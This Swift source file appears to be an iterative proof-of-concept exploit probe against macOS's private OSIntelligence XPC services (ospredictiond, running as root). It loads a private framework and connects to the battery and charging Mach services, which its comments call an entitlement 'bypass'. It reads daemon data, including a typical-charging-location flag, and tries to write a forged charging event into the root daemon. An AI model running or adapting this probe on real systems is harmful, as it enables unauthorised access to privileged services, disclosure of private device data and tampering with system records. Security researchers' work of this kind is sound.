// Gen 6: ospredictiond real protocol — corrected scalar reply types
//
// Key fixes vs Gen5:
//   1. Load OSIntelligence.framework via dlopen so _OSBatteryPredictorProtocol
//      and _OSChargingPredictorProtocol are in our process's ObjC runtime.
//   2. Use NSXPCInterface(with: objc_getProtocol(...)) so the XPC interface
//      is built from the SAME Protocol* the server registered.
//   3. Reply blocks use SCALAR types (Double, Bool) not NSNumber*, because
//      XPC encodes primitives differently from objects — mismatch = silent drop.
//   4. Log every error from the proxy error handler.
//
// If we get a REPLY line, we've obtained live data from ospredictiond (uid 0).

import Foundation
import ObjectiveC

// ── Load OSIntelligence.framework (registers real protocols in this process) ───

@discardableResult
func loadFramework() -> Bool {
    let paths = [
        "/System/Library/PrivateFrameworks/OSIntelligence.framework/OSIntelligence",
        "/System/Library/PrivateFrameworks/OSIntelligence.framework/Versions/A/OSIntelligence",
    ]
    for p in paths {
        if dlopen(p, RTLD_NOW | RTLD_GLOBAL) != nil {
            print("[fw] Loaded: \(p)")
            return true
        }
    }
    // Fallback: NSBundle (resolves dyld cache automatically)
    let url = URL(fileURLWithPath: "/System/Library/PrivateFrameworks/OSIntelligence.framework")
    if let b = Bundle(url: url), b.load() {
        print("[fw] Loaded via NSBundle")
        return true
    }
    print("[fw] WARNING: could not load framework explicitly (may still work via dyld cache)")
    return false
}

loadFramework()

// ── Scalar-typed reply protocol declarations ───────────────────────────────────
//
// These match the real selector names from nm/strings analysis.
// Reply block types use SCALAR primitives to match ObjC type encodings.

// Battery prediction XPC protocol
// ObjC name we target: _OSBatteryPredictorProtocol
@objc protocol BatteryPredXPC_v6: NSObjectProtocol {
    // Recommended wait time → NSTimeInterval (= Double)
    @objc optional func recommendedWaitTimeWithHandler(
        _ reply: @escaping (Double, Error?) -> Void)

    // Battery level → Double (0.0–1.0 or 0–100)
    @objc optional func currentBatteryLevelWithContext(
        _ context: NSDictionary?,
        reply: @escaping (Double, Error?) -> Void)

    // Battery life mitigation status → Int (enum) or Double
    @objc optional func batteryLifeMitigationWithHandler(
        _ reply: @escaping (Int, Error?) -> Void)

    // Typical charging location → Bool
    @objc optional func inTypicalChargingLocationWithHandler(
        _ reply: @escaping (Bool, Error?) -> Void)

    // Record event → Bool (success/failure)
    @objc optional func recordChargingEvent(
        _ event: NSDictionary?,
        withReply reply: @escaping (Bool, Error?) -> Void)
}

// Charging prediction XPC protocol
// ObjC name we target: _OSChargingPredictorProtocol
@objc protocol ChargingPredXPC_v6: NSObjectProtocol {
    @objc optional func adjustedChargingDecision(
        _ decision: NSDictionary?,
        withPluginDate date: NSDate?,
        withPluginBatteryLevel level: NSNumber?,
        forDate targetDate: NSDate?,
        forStatus status: NSNumber?,
        reply: @escaping (NSDictionary?, Error?) -> Void)

    @objc optional func recordChargingEvent(
        _ event: NSDictionary?,
        withReply reply: @escaping (Bool, Error?) -> Void)
}

// ── XPC connection helper ──────────────────────────────────────────────────────

func connectTo(service: String, proto: Protocol) -> (NSXPCConnection, AnyObject)? {
    // Try to use real Protocol* from the framework; fall back to our declaration
    let realProto: Protocol
    if let rp = objc_getProtocol(protocol_getName(proto)) {
        print("  [conn] Using real Protocol*: \(String(cString: protocol_getName(rp)))")
        realProto = rp
    } else {
        realProto = proto
    }

    let conn = NSXPCConnection(machServiceName: service, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: realProto)

    var alive = true
    conn.invalidationHandler = {
        alive = false
        print("  [conn] invalidated — entitlement enforced or service gone")
    }
    conn.interruptionHandler = {
        alive = false
        print("  [conn] interrupted — entitlement enforced (BLOCKED)")
    }
    conn.resume()

    Thread.sleep(forTimeInterval: 0.5)
    guard alive else { conn.invalidate(); return nil }
    print("  [conn] ACCEPTED (no entitlement check at connect time) ← bypass")

    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        print("  [xpc-error] \(err)")
    } as AnyObject
    return (conn, proxy)
}

func timedWait(_ s: DispatchSemaphore, label: String, timeout: Int = 8) -> Bool {
    let r = s.wait(timeout: .now() + .seconds(timeout))
    if r == .timedOut { print("  [\(label)] TIMEOUT — connection live, no reply in \(timeout)s") }
    return r == .success
}

// ── BATTERY probes ─────────────────────────────────────────────────────────────

print("""
=== Gen 6: OSIntelligence XPC — scalar reply types, real protocol lookup ===
PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())
macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)

""")

// Check if real protocols are registered
for name in ["_OSBatteryPredictorProtocol", "_OSChargingPredictorProtocol"] {
    if let p = objc_getProtocol(name) {
        print("[proto] FOUND: \(name) → \(p)")
    } else {
        print("[proto] NOT FOUND: \(name)")
    }
}
print("")

if let (battConn, battProxy) = connectTo(
    service: "com.apple.OSIntelligence.battery",
    proto: BatteryPredXPC_v6.self) {

    let p = battProxy as? BatteryPredXPC_v6
    print("\n── com.apple.OSIntelligence.battery (uid 0 root daemon) ──")

    // B1: recommendedWaitTimeWithHandler — scalar Double reply
    print("\n[B1] recommendedWaitTimeWithHandler → Double")
    let b1 = DispatchSemaphore(value: 0)
    p?.recommendedWaitTimeWithHandler? { secs, err in
        if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: \(secs) seconds  ← ROOT DAEMON RETURNED LIVE DATA") }
        b1.signal()
    }
    timedWait(b1, label: "B1")

    // B2: currentBatteryLevelWithContext — nil, scalar Double reply
    print("\n[B2] currentBatteryLevelWithContext(nil) → Double")
    let b2 = DispatchSemaphore(value: 0)
    p?.currentBatteryLevelWithContext?(nil) { level, err in
        if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: \(level)  ← battery level from root daemon") }
        b2.signal()
    }
    timedWait(b2, label: "B2")

    // B3: batteryLifeMitigationWithHandler — scalar Int reply
    print("\n[B3] batteryLifeMitigationWithHandler → Int")
    let b3 = DispatchSemaphore(value: 0)
    p?.batteryLifeMitigationWithHandler? { val, err in
        if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: \(val)  ← mitigation enum from root daemon") }
        b3.signal()
    }
    timedWait(b3, label: "B3")

    // B4: inTypicalChargingLocationWithHandler — Bool reply
    print("\n[B4] inTypicalChargingLocationWithHandler → Bool")
    let b4 = DispatchSemaphore(value: 0)
    p?.inTypicalChargingLocationWithHandler? { inLocation, err in
        if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: inTypicalLocation=\(inLocation)  ← location data from root daemon") }
        b4.signal()
    }
    timedWait(b4, label: "B4")

    // B5: recordChargingEvent — Bool reply
    print("\n[B5] recordChargingEvent(nil) → Bool")
    let b5 = DispatchSemaphore(value: 0)
    let chargingEvent: NSDictionary = [
        "type": "plugIn",
        "timestamp": NSDate(),
        "batteryLevel": NSNumber(value: 0.72),
    ]
    p?.recordChargingEvent?(chargingEvent) { ok, err in
        if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: ok=\(ok)  ← root daemon acked our event write") }
        b5.signal()
    }
    timedWait(b5, label: "B5")

    battConn.invalidate()
    Thread.sleep(forTimeInterval: 0.5)
}

// ── CHARGING probes ────────────────────────────────────────────────────────────

if let (chgConn, chgProxy) = connectTo(
    service: "com.apple.OSIntelligence.charging",
    proto: ChargingPredXPC_v6.self) {

    let p = chgProxy as? ChargingPredXPC_v6
    print("\n── com.apple.OSIntelligence.charging (uid 0 root daemon) ──")

    // C1: adjustedChargingDecision — NSDictionary reply
    print("\n[C1] adjustedChargingDecision(all nil) → NSDictionary")
    let c1 = DispatchSemaphore(value: 0)
    p?.adjustedChargingDecision?(
        nil, withPluginDate: nil,
        withPluginBatteryLevel: nil,
        forDate: NSDate(timeIntervalSinceNow: 3600),
        forStatus: NSNumber(value: 1)) { result, err in
        if let r = result { print("  REPLY: \(r)  ← charging decision from root daemon") }
        else if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: nil/nil") }
        c1.signal()
    }
    timedWait(c1, label: "C1")

    // C2: adjustedChargingDecision — with real battery data
    print("\n[C2] adjustedChargingDecision(plugIn=now, level=72%, target+1h)")
    let c2 = DispatchSemaphore(value: 0)
    p?.adjustedChargingDecision?(
        ["source": "com.apple.OSIntelligence.charging"],
        withPluginDate: NSDate(),
        withPluginBatteryLevel: NSNumber(value: 0.72),
        forDate: NSDate(timeIntervalSinceNow: 3600),
        forStatus: NSNumber(value: 1)) { result, err in
        if let r = result { print("  REPLY: \(r)  ← charging schedule from root daemon") }
        else if let e = err { print("  ERROR: \(e)") }
        else { print("  REPLY: nil/nil") }
        c2.signal()
    }
    timedWait(c2, label: "C2")

    chgConn.invalidate()
}

print("""

=== Gen 6 Complete ===
Any line starting REPLY: = live data from ospredictiond (root, uid 0)
Any line starting ERROR: = daemon replied with an error (still proves RPC dispatch)
Any TIMEOUT         = message dropped or daemon never called reply handler
""")
